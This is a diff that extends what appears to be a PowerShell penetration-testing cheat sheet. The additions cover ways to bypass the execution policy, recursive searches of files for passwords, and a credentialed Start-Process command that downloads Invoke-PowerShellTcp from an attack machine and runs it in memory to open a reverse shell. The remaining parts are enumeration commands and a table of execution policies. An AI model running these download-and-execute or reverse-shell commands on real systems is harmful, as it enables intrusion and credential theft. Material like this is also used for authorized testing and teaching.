@@ -50,9 +50,52 @@ Get-Command -Module PowerSploit
 Get-Help Get-System -examples
 ```
 
+## Command/Script Execution
 
+Get the execution policy:
 
+```
+Get-ExecutionPolicy
+Get-ExecutionPolicy -List | Format-Table -AutoSize
+```
 
+Bypass execution restriction only for a specific operation/command:
+
+```
+powershell.exe -ExecutionPolicy Bypass -File C:\file.ps1
+powershell.exe -ExecutionPolicy Bypass "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
+```
+
+Bypass execution restriction by piping the content of a locally stored script into Powershell:
+
+```
+Get-Content c:\windows\temp\file.ps1 | powershell.exe -noprofile -
+type c:\windows\temp\file.ps1 | powershell.exe -noprofile -
+```
+
+Bypass execution restriction by downloading and executing a script from memory:
+
+```
+powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/file.ps1')"
+```
+
+Bypass execution restriction by using the "command" switch:
+
+```
+powershell -c "Get-ACL c:\users\administrator | Select -ExpandProperty AccessToString"
+```
+
+### Powershell Execution Policies
+
+| Policy         | Description                                                                                                                                          |
+| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `AllSigned`    | Only scripts signed by a trusted publisher can be run.                                                                                               |
+| `Bypass`       | No restrictions; all Windows PowerShell scripts can be run.                                                                                          |
+| `Default`      | Normally `RemoteSigned`, but is controlled via ActiveDirectory                                                                                       |
+| `RemoteSigned` | Downloaded scripts must be signed by a trusted publisher before they can be run.                                                                     |
+| `Restricted`   | No scripts can be run. Windows PowerShell can be used only in interactive mode.                                                                      |
+| `Undefined`    | NA                                                                                                                                                   |
+| `Unrestricted` | Similar to `bypass,` however, _If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs._ |
 
 ## Information Gathering
 
@@ -103,6 +146,31 @@ Get list of listening TCP ports:
 
 ```
 Get-NetTcpConnection -State Listen
+```
+
+## File Operations
+
+Get the access list permissions of a directory or file:
+
+```
+Get-ACL c:\users\administrator | fl *
+Get-ACL c:\users\administrator |  Select -ExpandProperty AccessToString
+```
+
+> fl = Format-List
+
+Find specified strings in files:
+
+```
+Select-String -path c:\*.* -pattern password
+Select-String –path c:\users\*.txt –pattern password
+ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}
+```
+
+View a file:
+
+```
+Get-Content file.txt
 ```
 
 ## Windows Firewall
@@ -301,12 +369,18 @@ $password = ConvertTo-SecureString 'Password1' -AsPlainText -Force
 $credentialsObject = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 
+Run a command with the credentials object. In the example below, we are connecting to the attack machine to download and execute the "InvokePowershellTcp" script which will make a new reverse powershell connection as the "credentialsObject" user:
+
+```
+Start-Process -FilePath "powershell" -ArgumentList "IEX(New-Object Net.WebClient).DownloadString('http://10.x.x.x/Invoke-PowerShellTcp.ps1')" -Credential $credentialsObject
+```
+
 ## Applocker
 
 Get the "Effective" applocker policy:
 
 ```
-Get-ApplockerPolicy -Effective | Select -expandproperty RuleCollections
+Get-ApplockerPolicy -Effective | Select -ExpandProperty RuleCollections
 ```
 
 Get the "Local" applocker policy:
